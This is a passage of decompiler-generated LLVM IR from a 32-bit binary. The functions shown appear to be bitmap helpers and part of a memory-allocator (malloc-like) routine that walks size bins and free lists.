  %v0_8050ad1 = load i32, i32* @edx, align 4
  %v2_8050ad4 = ptrtoint i32* %stack_var_-140 to i32
  store i32 %v2_8050ad4, i32* %eax.global-to-local, align 4
  %v4_8050adc = call i32 @function_8050b58(i32 %v2_8050ad4, i32 %arg1, i32 %v0_8050ad1, i32 %v0_8050ad1)
  store i32 %v4_8050adc, i32* %eax.global-to-local, align 4
  %v2_8050ae4 = icmp slt i32 %v4_8050adc, 0
  br i1 %v2_8050ae4, label %dec_label_pc_8050b2c, label %dec_label_pc_8050ae8

dec_label_pc_8050ae8:                             ; preds = %dec_label_pc_8050ad1
  %v4_8050af0 = call i32 @function_8050b34(i32 ptrtoint (i32* @global_var_8054540.31 to i32), i32 %arg1, i32 %v4_8050adc, i32 %v4_8050adc)
  %v2_8050b09 = ptrtoint i32* %stack_var_-284 to i32
  %v2_8050b0e = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_8050b0e, i32* %eax.global-to-local, align 4
  %v4_8050b17 = call i32 @function_8052307(i32 %arg1, i32* nonnull %stack_var_-144, i32 %v2_8050b09)
  store i32 %v4_8050b17, i32* %eax.global-to-local, align 4
  %v2_8050b1f = icmp slt i32 %v4_8050b17, 0
  %v3_8050b23 = load i32, i32* %stack_var_-284, align 4
  %.v3_8050b23 = select i1 %v2_8050b1f, i32 -1, i32 %v3_8050b23
  br label %dec_label_pc_8050b2c

dec_label_pc_8050b2c:                             ; preds = %dec_label_pc_8050ae8, %dec_label_pc_8050aa8, %dec_label_pc_8050ad1
  %storemerge = phi i32 [ -1, %dec_label_pc_8050ad1 ], [ -1, %dec_label_pc_8050aa8 ], [ %.v3_8050b23, %dec_label_pc_8050ae8 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_8050ace, { 2, 1, 0 }
  uselistorder i32* %stack_var_-144, { 0, 2, 1 }
  uselistorder i32* %eax.global-to-local, { 7, 0, 1, 2, 3, 4, 8, 9, 10, 11, 5, 6 }
  uselistorder i32 284, { 0, 4, 5, 6, 7, 8, 1, 2, 3, 9 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 2, 3, 1, 0, 4 }
  uselistorder label %dec_label_pc_8050b2c, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8050ac3.dec_label_pc_8050ac3_crit_edge, { 1, 0 }
}

define i32 @function_8050b34(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8050b34:
  %v1_8050b42 = add i32 %arg2, -1
  %v1_8050b45 = urem i32 %v1_8050b42, 32
  %v2_8050b45 = icmp eq i32 %v1_8050b45, 0
  %v2_8050b48 = udiv i32 %v1_8050b42, 32
  br i1 %v2_8050b45, label %bb5, label %bb

bb:                                               ; preds = %dec_label_pc_8050b34
  %v5_8050b4b = shl i32 1, %v1_8050b45
  br label %bb5

bb5:                                              ; preds = %dec_label_pc_8050b34, %bb
  %v6_8050b4d = phi i32 [ 1, %dec_label_pc_8050b34 ], [ %v5_8050b4b, %bb ]
  %v2_8050b4d = mul nuw nsw i32 %v2_8050b48, 4
  %v3_8050b4d = add i32 %v2_8050b4d, %arg1
  %v4_8050b4d = inttoptr i32 %v3_8050b4d to i32*
  %v5_8050b4d = load i32, i32* %v4_8050b4d, align 4
  %v7_8050b4d = and i32 %v5_8050b4d, %v6_8050b4d
  %v8_8050b4d = icmp eq i32 %v7_8050b4d, 0
  %v1_8050b51 = icmp eq i1 %v8_8050b4d, false
  %v2_8050b51 = zext i1 %v1_8050b51 to i32
  ret i32 %v2_8050b51

; uselistorder directives
  uselistorder i32 %v1_8050b45, { 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @function_8050b58(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8050b58:
  %stack_var_-4 = alloca i32, align 4
  %v0_8050b58 = load i32, i32* @ebx, align 4
  store i32 %v0_8050b58, i32* %stack_var_-4, align 4
  %v1_8050b66 = add i32 %arg2, -1
  %v1_8050b69 = urem i32 %v1_8050b66, 32
  %v2_8050b69 = icmp eq i32 %v1_8050b69, 0
  store i32 %v1_8050b69, i32* @ecx, align 4
  %v2_8050b6c = udiv i32 %v1_8050b66, 32
  store i32 %v2_8050b6c, i32* @edx, align 4
  br i1 %v2_8050b69, label %bb5, label %bb

bb:                                               ; preds = %dec_label_pc_8050b58
  %v5_8050b6f = shl i32 1, %v1_8050b69
  br label %bb5

bb5:                                              ; preds = %dec_label_pc_8050b58, %bb
  %v6_8050b71 = phi i32 [ 1, %dec_label_pc_8050b58 ], [ %v5_8050b6f, %bb ]
  %v2_8050b71 = mul nuw nsw i32 %v2_8050b6c, 4
  %v3_8050b71 = add i32 %v2_8050b71, %arg1
  %v4_8050b71 = inttoptr i32 %v3_8050b71 to i32*
  %v5_8050b71 = load i32, i32* %v4_8050b71, align 4
  %v7_8050b71 = or i32 %v5_8050b71, %v6_8050b71
  store i32 %v7_8050b71, i32* %v4_8050b71, align 4
  %v2_8050b76 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8050b76, i32* @ebx, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_8050b6c, { 1, 0 }
  uselistorder i32 %v1_8050b69, { 2, 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @function_8050b78() local_unnamed_addr {
dec_label_pc_8050b78:
  %v0_8050b78 = load i32, i32* @eax, align 4
  %v6_8050b8b = icmp ugt i32 %v0_8050b78, 16777215
  br i1 %v6_8050b8b, label %dec_label_pc_8050b9c, label %dec_label_pc_8050b8d

dec_label_pc_8050b8d:                             ; preds = %dec_label_pc_8050b78
  %v2_8050b7b = udiv i32 %v0_8050b78, 256
  %tmp = icmp ult i32 %v0_8050b78, 256
  %v2_8050b8d = call i32 @llvm.ctlz.i32(i32 %v2_8050b7b, i1 true)
  %v3_8050b8d = xor i32 %v2_8050b8d, 31
  %v5_8050b8d = select i1 %tmp, i32 95, i32 %v3_8050b8d
  %v1_8050b90 = add nuw nsw i32 %v5_8050b8d, 6
  %v2_8050b93 = urem i32 %v1_8050b90, 32
  %v4_8050b93 = icmp eq i32 %v2_8050b93, 0
  br i1 %v4_8050b93, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_8050b8d
  %v5_8050b93 = lshr i32 %v0_8050b78, %v2_8050b93
  br label %bb4

bb4:                                              ; preds = %dec_label_pc_8050b8d, %bb
  %v0_8050b95 = phi i32 [ %v0_8050b78, %dec_label_pc_8050b8d ], [ %v5_8050b93, %bb ]
  %v1_8050b95 = urem i32 %v0_8050b95, 4
  %v2_8050b98 = mul nuw nsw i32 %v5_8050b8d, 4
  %v3_8050b98 = or i32 %v1_8050b95, 32
  %v4_8050b98 = add nuw nsw i32 %v3_8050b98, %v2_8050b98
  br label %dec_label_pc_8050b9c

dec_label_pc_8050b9c:                             ; preds = %dec_label_pc_8050b78, %bb4
  %v0_8050b9d = phi i32 [ 95, %dec_label_pc_8050b78 ], [ %v4_8050b98, %bb4 ]
  ret i32 %v0_8050b9d

; uselistorder directives
  uselistorder i32 %v2_8050b93, { 1, 0 }
  uselistorder i32 %v0_8050b78, { 2, 3, 0, 1, 4 }
  uselistorder label %dec_label_pc_8050b9c, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @function_8050b9e(i32 %arg1) local_unnamed_addr {
dec_label_pc_8050b9e:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8050b9e = load i32, i32* @ebp, align 4
  %v0_8050b9f = load i32, i32* @edi, align 4
  %v0_8050ba0 = load i32, i32* @esi, align 4
  %v0_8050ba1 = load i32, i32* @ebx, align 4
  store i32 %v0_8050ba1, i32* %stack_var_-16, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v2_8050bb3 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8050bb3, i32* @eax, align 4
  store i32 %v2_8050bb3, i32* %stack_var_-92, align 4
  %v2_8050bb8 = call i32 @function_80520ca(i32 %v2_8050bb3, i32 134553799)
  store i32 %v2_8050bb8, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_80542e0.32 to i32), i32* %stack_var_-92, align 4
  %v1_8050bc4 = call i32 @function_80520c7(i32 ptrtoint (i32* @global_var_80542e0.32 to i32))
  store i32 %v1_8050bc4, i32* %eax.global-to-local, align 4
  %v0_8050bcc = load i32, i32* %ebx.global-to-local, align 4
  %tmp123 = icmp ult i32 %v0_8050bcc, -32
  br i1 %tmp123, label %dec_label_pc_8050be3, label %dec_label_pc_8050bd1

dec_label_pc_8050bd1:                             ; preds = %dec_label_pc_8050b9e
  %v0_8050bd1 = load i32, i32* %stack_var_-92, align 4
  %v1_8050bd1 = call i32 @function_805076b(i32 %v0_8050bd1)
  store i32 %v1_8050bd1, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_8050bd8 = inttoptr i32 %v1_8050bd1 to i32*
  store i32 12, i32* %v1_8050bd8, align 4
  br label %dec_label_pc_8051308

dec_label_pc_8050be3:                             ; preds = %dec_label_pc_8050b9e
  %v1_8050be3 = add i32 %v0_8050bcc, 11
  %tmp124 = icmp ult i32 %v1_8050be3, 16
  %v1_8050bf3 = and i32 %v1_8050be3, -8
  %v1_8050be3.v1_8050bf3 = select i1 %tmp124, i32 %v1_8050be3, i32 %v1_8050bf3
  %.v1_8050bf3 = select i1 %tmp124, i32 16, i32 %v1_8050bf3
  store i32 %v1_8050be3.v1_8050bf3, i32* %eax.global-to-local, align 4
  %v0_8050bfa = load i8, i8* @global_var_80545c0.33, align 1
  %v1_8050bfa = sext i8 %v0_8050bfa to i32
  store i32 %v1_8050bfa, i32* @ebx, align 4
  %v3_8050c00 = urem i8 %v0_8050bfa, 2
  %v4_8050c00 = icmp eq i8 %v3_8050c00, 0
  %v1_8050c03 = icmp eq i1 %v4_8050c00, false
  br i1 %v1_8050c03, label %dec_label_pc_8050c22, label %dec_label_pc_8050c05

dec_label_pc_8050c05:                             ; preds = %dec_label_pc_8050be3
  %v2_8050c05 = icmp eq i8 %v0_8050bfa, 0
  %v1_8050c07 = icmp eq i1 %v2_8050c05, false
  br i1 %v1_8050c07, label %dec_label_pc_8050efd, label %dec_label_pc_8050c0d

dec_label_pc_8050c0d:                             ; preds = %dec_label_pc_8050c05
  store i32 ptrtoint (i8* @global_var_80545c0.33 to i32), i32* %stack_var_-92, align 4
  %v2_8050c15 = call i32 @function_80517bb(i32* bitcast (i8* @global_var_80545c0.33 to i32*))
  store i32 %v2_8050c15, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050efd

dec_label_pc_8050c22:                             ; preds = %dec_label_pc_8050be3
  %v11_8050c22 = trunc i32 %.v1_8050bf3 to i8
  %v8_8050c26 = icmp ugt i8 %v11_8050c22, %v0_8050bfa
  br i1 %v8_8050c26, label %dec_label_pc_8050c43, label %dec_label_pc_8050c28

dec_label_pc_8050c28:                             ; preds = %dec_label_pc_8050c22
  %v2_8050c2c = udiv i32 %.v1_8050bf3, 2
  store i32 %v2_8050c2c, i32* %eax.global-to-local, align 4
  %v1_8050c2e = add i32 %v2_8050c2c, ptrtoint (i8* @global_var_80545c0.33 to i32)
  store i32 %v1_8050c2e, i32* %ecx.global-to-local, align 4
  %v1_8050c34 = add i32 %v2_8050c2c, add (i32 ptrtoint (i8* @global_var_80545c0.33 to i32), i32 -4)
  %v2_8050c34 = inttoptr i32 %v1_8050c34 to i32*
  %v3_8050c34 = load i32, i32* %v2_8050c34, align 4
  store i32 %v3_8050c34, i32* @edx, align 4
  %v1_8050c37 = icmp eq i32 %v3_8050c34, 0
  br i1 %v1_8050c37, label %dec_label_pc_8050c43, label %dec_label_pc_8050c3b

dec_label_pc_8050c3b:                             ; preds = %dec_label_pc_8050c28
  %v1_8050c3b = add i32 %v3_8050c34, 8
  %v2_8050c3b = inttoptr i32 %v1_8050c3b to i32*
  %v3_8050c3b = load i32, i32* %v2_8050c3b, align 4
  store i32 %v3_8050c3b, i32* %eax.global-to-local, align 4
  store i32 %v3_8050c3b, i32* %v2_8050c34, align 4
  br label %dec_label_pc_8050c7c

dec_label_pc_8050c43:                             ; preds = %dec_label_pc_8050c28, %dec_label_pc_8050c22
  %v8_8050c43 = icmp ult i32 %.v1_8050bf3, 255
  %v6_8050c4b = icmp ugt i32 %.v1_8050bf3, 255
  store i32 %.v1_8050bf3, i32* @eax, align 4
  br i1 %v6_8050c4b, label %dec_label_pc_8050c84, label %dec_label_pc_8050c4d

dec_label_pc_8050c4d:                             ; preds = %dec_label_pc_8050c43
  %v2_8050c51 = udiv i32 %.v1_8050bf3, 8
  store i32 %v2_8050c51, i32* %eax.global-to-local, align 4
  %v1_8050c58 = mul nuw i32 %v2_8050c51, 8
  %v2_8050c58 = add i32 %v1_8050c58, ptrtoint (i32* @global_var_80545ec.34 to i32)
  store i32 %v2_8050c58, i32* %ecx.global-to-local, align 4
  %v1_8050c5f = add i32 %v1_8050c58, add (i32 ptrtoint (i32* @global_var_80545ec.34 to i32), i32 12)
  %v2_8050c5f = inttoptr i32 %v1_8050c5f to i32*
  %v3_8050c5f = load i32, i32* %v2_8050c5f, align 4
  store i32 %v3_8050c5f, i32* @edx, align 4
  %v12_8050c62 = icmp eq i32 %v3_8050c5f, %v2_8050c58
  br i1 %v12_8050c62, label %dec_label_pc_8050d80.preheader, label %dec_label_pc_8050c6a

dec_label_pc_8050c6a:                             ; preds = %dec_label_pc_8050c4d
  store i32 %.v1_8050bf3, i32* %ebx.global-to-local, align 4
  %v1_8050c6e = add i32 %v3_8050c5f, 12
  %v2_8050c6e = inttoptr i32 %v1_8050c6e to i32*
  %v3_8050c6e = load i32, i32* %v2_8050c6e, align 4
  store i32 %v3_8050c6e, i32* %eax.global-to-local, align 4
  store i32 %v3_8050c6e, i32* %v2_8050c5f, align 4
  %v0_8050c74 = load i32, i32* @edx, align 4
  %v1_8050c74 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8050c74 = add i32 %v0_8050c74, 4
  %v3_8050c74 = add i32 %v2_8050c74, %v1_8050c74
  %v4_8050c74 = inttoptr i32 %v3_8050c74 to i32*
  %v5_8050c74 = load i32, i32* %v4_8050c74, align 4
  %v6_8050c74 = or i32 %v5_8050c74, 1
  store i32 %v6_8050c74, i32* %v4_8050c74, align 4
  %v0_8050c79 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8050c79 = load i32, i32* %eax.global-to-local, align 4
  %v2_8050c79 = add i32 %v1_8050c79, 8
  %v3_8050c79 = inttoptr i32 %v2_8050c79 to i32*
  store i32 %v0_8050c79, i32* %v3_8050c79, align 4
  br label %dec_label_pc_8050c7c

dec_label_pc_8050c7c:                             ; preds = %dec_label_pc_8051019, %dec_label_pc_805102b, %dec_label_pc_8050c3b, %dec_label_pc_8050c6a
  %v0_8050c7c = load i32, i32* @edx, align 4
  %v1_8050c7c = add i32 %v0_8050c7c, 8
  store i32 %v1_8050c7c, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80512f7

dec_label_pc_8050c84:                             ; preds = %dec_label_pc_8050c43
  %v0_8050c88 = call i32 @function_8050b78()
  store i32 %v0_8050c88, i32* %eax.global-to-local, align 4
  %v3_8050c8d = and i8 %v0_8050bfa, 2
  %v4_8050c8d = icmp eq i8 %v3_8050c8d, 0
  %v6_8050c8d = zext i8 %v3_8050c8d to i32
  %v9_8050c8d = and i32 %v1_8050bfa, -256
  %v10_8050c8d = or i32 %v9_8050c8d, %v6_8050c8d
  store i32 %v10_8050c8d, i32* @ebx, align 4
  br i1 %v4_8050c8d, label %dec_label_pc_8050d80.preheader, label %dec_label_pc_8050c9a

dec_label_pc_8050c9a:                             ; preds = %dec_label_pc_8050c84
  store i32 ptrtoint (i8* @global_var_80545c0.33 to i32), i32* %stack_var_-92, align 4
  %v2_8050ca2 = call i32 @function_80517bb(i32* bitcast (i8* @global_var_80545c0.33 to i32*))
  store i32 %v2_8050ca2, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050d80.preheader

dec_label_pc_8050d80.preheader:                   ; preds = %dec_label_pc_8050c9a, %dec_label_pc_8050c4d, %dec_label_pc_8050c84
  %stack_var_-40.0.ph = phi i32 [ %v2_8050c51, %dec_label_pc_8050c4d ], [ %v0_8050c88, %dec_label_pc_8050c9a ], [ %v0_8050c88, %dec_label_pc_8050c84 ]
  %v0_8050d809 = load i32, i32* @global_var_8054600.37, align 512
  store i32 %v0_8050d809, i32* @ebp, align 4
  %v9_8050d8615 = icmp eq i32 %v0_8050d809, 134563316
  %v1_8050d8c17 = icmp eq i1 %v9_8050d8615, false
  br i1 %v1_8050d8c17, label %dec_label_pc_8050caf.lr.ph, label %dec_label_pc_8050d92

dec_label_pc_8050caf.lr.ph:                       ; preds = %dec_label_pc_8050d80.preheader
  %v1_8050cd6 = add i32 %.v1_8050bf3, 16
  br label %dec_label_pc_8050caf

dec_label_pc_8050caf:                             ; preds = %dec_label_pc_8050caf.lr.ph, %dec_label_pc_8050d80
  %v1_80512a9 = phi i32 [ %v0_8050d809, %dec_label_pc_8050caf.lr.ph ], [ %v0_8050d80, %dec_label_pc_8050d80 ]
  %v1_8050caf = add i32 %v1_80512a9, 4
  %v2_8050caf = inttoptr i32 %v1_8050caf to i32*
  %v3_8050caf = load i32, i32* %v2_8050caf, align 4
  %v1_8050cb2 = add i32 %v1_80512a9, 12
  %v2_8050cb2 = inttoptr i32 %v1_8050cb2 to i32*
  %v3_8050cb2 = load i32, i32* %v2_8050cb2, align 4
  store i32 %v3_8050cb2, i32* @edx, align 4
  %v1_8050cb5 = and i32 %v3_8050caf, -4
  store i32 %v1_8050cb5, i32* @edi, align 4
  %v9_8050cc2 = icmp eq i32 %v3_8050cb2, 134563316
  %v1_8050cc8 = icmp eq i1 %v9_8050cc2, false
  %or.cond95 = or i1 %v6_8050c4b, %v1_8050cc8
  br i1 %or.cond95, label %dec_label_pc_8050ce1, label %dec_label_pc_8050cca

dec_label_pc_8050cca:                             ; preds = %dec_label_pc_8050caf
  %v1_8050cca = load i32, i32* @global_var_80545f0.35, align 16
  %v12_8050cca = icmp eq i32 %v1_80512a9, %v1_8050cca
  %v1_8050cd0 = icmp eq i1 %v12_8050cca, false
  br i1 %v1_8050cd0, label %dec_label_pc_8050ce1, label %dec_label_pc_8050cd2

dec_label_pc_8050cd2:                             ; preds = %dec_label_pc_8050cca
  store i32 %v1_8050cd6, i32* %eax.global-to-local, align 4
  %v6_8050cdb = icmp ugt i32 %v1_8050cb5, %v1_8050cd6
  br i1 %v6_8050cdb, label %dec_label_pc_8051292, label %dec_label_pc_8050ce1

dec_label_pc_8050ce1:                             ; preds = %dec_label_pc_8050cd2, %dec_label_pc_8050cca, %dec_label_pc_8050caf
  store i32 ptrtoint (i32* @global_var_80545f4.36 to i32), i32* %eax.global-to-local, align 4
  %v2_8050ce6 = add i32 %v3_8050cb2, 8
  %v3_8050ce6 = inttoptr i32 %v2_8050ce6 to i32*
  store i32 ptrtoint (i32* @global_var_80545f4.36 to i32), i32* %v3_8050ce6, align 4
  %v0_8050ce9 = load i32, i32* @edx, align 4
  store i32 %v0_8050ce9, i32* @global_var_8054600.37, align 4
  %v0_8050cec = load i32, i32* @edi, align 4
  %v15_8050cec = icmp eq i32 %v0_8050cec, %.v1_8050bf3
  br i1 %v15_8050cec, label %dec_label_pc_80512d3, label %dec_label_pc_8050cf6

dec_label_pc_8050cf6:                             ; preds = %dec_label_pc_8050ce1
  %v6_8050cfc = icmp ugt i32 %v0_8050cec, 255
  br i1 %v6_8050cfc, label %dec_label_pc_8050d0f, label %dec_label_pc_8050cfe

dec_label_pc_8050cfe:                             ; preds = %dec_label_pc_8050cf6
  %v2_8050d00 = udiv i32 %v0_8050cec, 8
  store i32 %v2_8050d00, i32* %esi.global-to-local, align 4
  %v1_8050d03 = mul nuw i32 %v2_8050d00, 8
  %v2_8050d03 = add i32 %v1_8050d03, 134563308
  store i32 %v2_8050d03, i32* @ebx, align 4
  %v1_8050d0a = add i32 %v1_8050d03, 134563316
  %v2_8050d0a = inttoptr i32 %v1_8050d0a to i32*
  %v3_8050d0a = load i32, i32* %v2_8050d0a, align 4
  store i32 %v3_8050d0a, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050d58

dec_label_pc_8050d0f:                             ; preds = %dec_label_pc_8050cf6
  store i32 %v0_8050cec, i32* @eax, align 4
  %v0_8050d11 = call i32 @function_8050b78()
  store i32 %v0_8050d11, i32* %esi.global-to-local, align 4
  %v1_8050d18 = mul i32 %v0_8050d11, 8
  %v2_8050d18 = add i32 %v1_8050d18, ptrtoint (i32* @global_var_80545ec.34 to i32)
  store i32 %v2_8050d18, i32* %eax.global-to-local, align 4
  %v1_8050d1f = add i32 %v1_8050d18, add (i32 ptrtoint (i32* @global_var_80545ec.34 to i32), i32 8)
  %v2_8050d1f = inttoptr i32 %v1_8050d1f to i32*
  %v3_8050d1f = load i32, i32* %v2_8050d1f, align 4
  store i32 %v3_8050d1f, i32* %edx.global-to-local, align 4
  store i32 %v3_8050d1f, i32* @ebx, align 4
  %v12_8050d28 = icmp eq i32 %v3_8050d1f, %v2_8050d18
  br i1 %v12_8050d28, label %dec_label_pc_8050d58, label %dec_label_pc_8050d2c

dec_label_pc_8050d2c:                             ; preds = %dec_label_pc_8050d0f
  %v1_8050d2c = add i32 %v1_8050d18, add (i32 ptrtoint (i32* @global_var_80545ec.34 to i32), i32 12)
  %v2_8050d2c = inttoptr i32 %v1_8050d2c to i32*
  %v3_8050d2c = load i32, i32* %v2_8050d2c, align 4
  store i32 %v3_8050d2c, i32* @ebx, align 4
  %v0_8050d2f = load i32, i32* @edi, align 4
  %v2_8050d2f = add i32 %v3_8050d2c, 4
  %v3_8050d2f = inttoptr i32 %v2_8050d2f to i32*
  %v4_8050d2f = load i32, i32* %v3_8050d2f, align 4
  %v10_8050d2f = icmp ult i32 %v0_8050d2f, %v4_8050d2f
  %v1_8050d32 = icmp eq i1 %v10_8050d2f, false
  br i1 %v1_8050d32, label %dec_label_pc_8050d3a, label %dec_label_pc_8050d58

dec_label_pc_8050d3a:                             ; preds = %dec_label_pc_8050d2c
  %v1_8050d3c = or i32 %v0_8050d2f, 1
  store i32 %v1_8050d3c, i32* %eax.global-to-local, align 4
  store i32 %v3_8050d1f, i32* %ebx.global-to-local, align 4
  %v2_8050d50109 = add i32 %v3_8050d1f, 4
  %v3_8050d50110 = inttoptr i32 %v2_8050d50109 to i32*
  %v4_8050d50111 = load i32, i32* %v3_8050d50110, align 4
  %v10_8050d50112 = icmp ult i32 %v1_8050d3c, %v4_8050d50111
  br i1 %v10_8050d50112, label %dec_label_pc_8050d41, label %dec_label_pc_8050d55

dec_label_pc_8050d41:                             ; preds = %dec_label_pc_8050d3a, %dec_label_pc_8050d41
  %v0_8050d55113 = phi i32 [ %v3_8050d45, %dec_label_pc_8050d41 ], [ %v3_8050d1f, %dec_label_pc_8050d3a ]
  store i32 %v0_8050d55113, i32* %ecx.global-to-local, align 4
  %v1_8050d45 = add i32 %v0_8050d55113, 8
  %v2_8050d45 = inttoptr i32 %v1_8050d45 to i32*
  %v3_8050d45 = load i32, i32* %v2_8050d45, align 4
  store i32 %v3_8050d45, i32* %ecx.global-to-local, align 4
  store i32 %v3_8050d45, i32* %ebx.global-to-local, align 4
  %v2_8050d50 = add i32 %v3_8050d45, 4
  %v3_8050d50 = inttoptr i32 %v2_8050d50 to i32*
  %v4_8050d50 = load i32, i32* %v3_8050d50, align 4
  %v10_8050d50 = icmp ult i32 %v1_8050d3c, %v4_8050d50
  br i1 %v10_8050d50, label %dec_label_pc_8050d41, label %dec_label_pc_8050d55

dec_label_pc_8050d55:                             ; preds = %dec_label_pc_8050d41, %dec_label_pc_8050d3a
  %v0_8050d55.lcssa = phi i32 [ %v3_8050d1f, %dec_label_pc_8050d3a ], [ %v3_8050d45, %dec_label_pc_8050d41 ]
  %v1_8050d55 = add i32 %v0_8050d55.lcssa, 12
  %v2_8050d55 = inttoptr i32 %v1_8050d55 to i32*
  %v3_8050d55 = load i32, i32* %v2_8050d55, align 4
  store i32 %v3_8050d55, i32* @ebx, align 4
  br label %dec_label_pc_8050d58

dec_label_pc_8050d58:                             ; preds = %dec_label_pc_8050cfe, %dec_label_pc_8050d2c, %dec_label_pc_8050d0f, %dec_label_pc_8050d55
  %v0_8050d58 = phi i32 [ %v0_8050d11, %dec_label_pc_8050d0f ], [ %v0_8050d11, %dec_label_pc_8050d55 ], [ %v0_8050d11, %dec_label_pc_8050d2c ], [ %v2_8050d00, %dec_label_pc_8050cfe ]
  %stack_var_-64.1 = phi i32 [ %v2_8050d18, %dec_label_pc_8050d0f ], [ %v0_8050d55.lcssa, %dec_label_pc_8050d55 ], [ %v2_8050d18, %dec_label_pc_8050d2c ], [ %v3_8050d0a, %dec_label_pc_8050cfe ]
  %v1_8050d5a = urem i32 %v0_8050d58, 32
  %v2_8050d5a = icmp eq i32 %v1_8050d5a, 0
  store i32 %v1_8050d5a, i32* %esi.global-to-local, align 4
  store i32 %v1_8050d5a, i32* %ecx.global-to-local, align 4
  store i32 1, i32* %eax.global-to-local, align 4
  %v2_8050d64 = sdiv i32 %v0_8050d58, 32
  store i32 %v2_8050d64, i32* %edx.global-to-local, align 4
  br i1 %v2_8050d5a, label %dec_label_pc_8050d80, label %bb

bb:                                               ; preds = %dec_label_pc_8050d58
  %v5_8050d67 = shl i32 1, %v1_8050d5a
  store i32 %v5_8050d67, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050d80

dec_label_pc_8050d80:                             ; preds = %dec_label_pc_8050d58, %bb
  %v5_8050d69 = phi i32 [ 1, %dec_label_pc_8050d58 ], [ %v5_8050d67, %bb ]
  %v1_8050d69 = mul nsw i32 %v2_8050d64, 4
  %v2_8050d69 = add i32 %v1_8050d69, ptrtoint (i32* @global_var_80548f4.38 to i32)
  %v3_8050d69 = inttoptr i32 %v2_8050d69 to i32*
  %v4_8050d69 = load i32, i32* %v3_8050d69, align 4
  %v6_8050d69 = or i32 %v4_8050d69, %v5_8050d69
  store i32 %v6_8050d69, i32* %v3_8050d69, align 4
  %v0_8050d70 = load i32, i32* @ebx, align 4
  %v1_8050d70 = load i32, i32* @ebp, align 4
  %v2_8050d70 = add i32 %v1_8050d70, 12
  %v3_8050d70 = inttoptr i32 %v2_8050d70 to i32*
  store i32 %v0_8050d70, i32* %v3_8050d70, align 4
  store i32 %stack_var_-64.1, i32* @esi, align 4
  %v1_8050d77 = load i32, i32* @ebp, align 4
  %v2_8050d77 = add i32 %v1_8050d77, 8
  %v3_8050d77 = inttoptr i32 %v2_8050d77 to i32*
  store i32 %stack_var_-64.1, i32* %v3_8050d77, align 4
  %v0_8050d7a = load i32, i32* @ebp, align 4
  %v1_8050d7a = load i32, i32* @ebx, align 4
  %v2_8050d7a = add i32 %v1_8050d7a, 8
  %v3_8050d7a = inttoptr i32 %v2_8050d7a to i32*
  store i32 %v0_8050d7a, i32* %v3_8050d7a, align 4
  %v0_8050d7d = load i32, i32* @ebp, align 4
  %v1_8050d7d = load i32, i32* @esi, align 4
  %v2_8050d7d = add i32 %v1_8050d7d, 12
  %v3_8050d7d = inttoptr i32 %v2_8050d7d to i32*
  store i32 %v0_8050d7d, i32* %v3_8050d7d, align 4
  %v0_8050d80 = load i32, i32* @global_var_8054600.37, align 512
  store i32 %v0_8050d80, i32* @ebp, align 4
  %v9_8050d86 = icmp eq i32 %v0_8050d80, 134563316
  %v1_8050d8c = icmp eq i1 %v9_8050d86, false
  br i1 %v1_8050d8c, label %dec_label_pc_8050caf, label %dec_label_pc_8050d92

dec_label_pc_8050d92:                             ; preds = %dec_label_pc_8050d80, %dec_label_pc_8050d80.preheader
  br i1 %v8_8050c43, label %dec_label_pc_8050e20, label %dec_label_pc_8050da0

dec_label_pc_8050da0:                             ; preds = %dec_label_pc_8050d92
  store i32 %stack_var_-40.0.ph, i32* %eax.global-to-local, align 4
  %v1_8050da4 = mul i32 %stack_var_-40.0.ph, 8
  %v2_8050da4 = add i32 %v1_8050da4, ptrtoint (i32* @global_var_80545ec.34 to i32)
  store i32 %v2_8050da4, i32* %edx.global-to-local, align 4
  %v1_8050dab = add i32 %v1_8050da4, add (i32 ptrtoint (i32* @global_var_80545ec.34 to i32), i32 12)
  %v2_8050dab = inttoptr i32 %v1_8050dab to i32*
  %storemerge1.pre = load i32, i32* %v2_8050dab, align 4
  br label %dec_label_pc_8050e1c

dec_label_pc_8050db0:                             ; preds = %dec_label_pc_8050e1c
  %v1_8050db0 = add i32 %v4_8050dc7, 4
  %v2_8050db0 = inttoptr i32 %v1_8050db0 to i32*
  %v3_8050db0 = load i32, i32* %v2_8050db0, align 4
  store i32 %v3_8050db0, i32* %ebx.global-to-local, align 4
  %v1_8050db3 = add i32 %v4_8050dc7, 12
  %v2_8050db3 = inttoptr i32 %v1_8050db3 to i32*
  %v3_8050db3 = load i32, i32* %v2_8050db3, align 4
  store i32 %v3_8050db3, i32* @ecx, align 4
  %v1_8050db6 = and i32 %v3_8050db0, -4
  store i32 %v1_8050db6, i32* @ebx, align 4
  %v10_8050db9 = icmp ult i32 %v1_8050db6, %.v1_8050bf3
  br i1 %v10_8050db9, label %dec_label_pc_8050e1c, label %dec_label_pc_8050dbf

